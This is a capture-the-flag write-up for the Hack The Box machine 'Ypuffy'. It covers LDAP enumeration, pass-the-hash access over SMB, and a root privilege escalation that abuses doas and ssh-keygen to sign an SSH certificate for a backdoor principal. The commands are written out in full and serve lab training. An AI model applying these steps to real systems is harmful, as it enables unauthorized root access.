# YPUFFY
### Info:
OS: OpenBSD<br>
IP: 10.10.10.107<br>
Difficulty : Medium++<br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.107
```
gives us the results : <br>
![alt text](https://i.imgur.com/BJviGis.png) <br>
We find port 389(ldap) port open
<br>
### Exploitation:
Vulnerability Exploited: Pass the hash<br>
![alt text](https://i.imgur.com/XhqlEXQ.png)<br>
As we find ldap we connect it via gui and find user alice1978 and her password hash.
![alt text](https://i.imgur.com/IvWB3dO.png)<br>
Using those creds we connect via smbclient and find a `.ppk` file which is putty private files.<br>
We convert `.ppk to .key` files for ssh
![alt text](https://i.imgur.com/1Pe7t1T.png)
<br>
### Privilege Escalation:
We look into `access.log` in dir `/var/www/logs`
```
ypuffy$ cat access.log | grep root
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:37:37 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:37:37 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:09:07 -0500] "GET /sshauth?type=keys%2526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:15:10 -0500] "GET /sshauth?type=keys%252526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:16:58 -0500] "GET /sshauth?type=keys%2526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 10.10.16.16 - - [29/Jan/2019:15:17:59 -0500] "GET /sshauth?type=keys%252526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 10.10.16.16 - - [29/Jan/2019:15:18:12 -0500] "GET /sshauth?type=keys%2526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 10.10.16.16 - - [29/Jan/2019:15:18:46 -0500] "GET /sshauth?type=keys%2526username=root HTTP/1.1" 400 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:34:56 -0500] "GET /sshauth?type=principals%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:38:56 -0500] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:52:21 -0500] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:52:21 -0500] "GET /sshauth?type=principals%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:15:52:21 -0500] "GET /sshauth?type=principals%26username=root HTTP/1.1" 200 0
ypuffy.hackthebox.htb 127.0.0.1 - - [29/Jan/2019:20:27:45 -0500] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
```
where we see a specific `principals` command log. <br>
Making a curl request :
```
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"
```
gives us `3m3rgencyB4ckd00r`. <br>
Going into /tmp and doing :
```
ypuffy$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/alice1978/.ssh/id_rsa): test_ca
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test_ca.
Your public key has been saved in test_ca.pub.
The key fingerprint is:
SHA256:ZRHEu5Qo/wCw1V5n22tizg0jf2AvgemJzzJY7sfK+qI alice1978@ypuffy.hackthebox.htb
The key's randomart image is:
+---[RSA 2048]----+
|       . o+.     |
|    . . . o.o    |
|     + . oo= o   |
|    . o oo+ . .  |
|       +S. +   . |
|        + = O o  |
|       + * O X   |
|      o.=.* = +  |
|    E..==*o  o   |
+----[SHA256]-----+
```
We are going to use the doas command to run the ssh-keygen command as the `userca` user:
```
doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root -V +1w test_ca.pub
```
Now we should be able to SSH as root user!
```
ssh -v -i test_ca root@localhost
```
### Gained knowledge:
SSH-keygen <br>
ldap and smbclient usage <br>
Privesc OpenBsd <br>
Pass the hash attack 
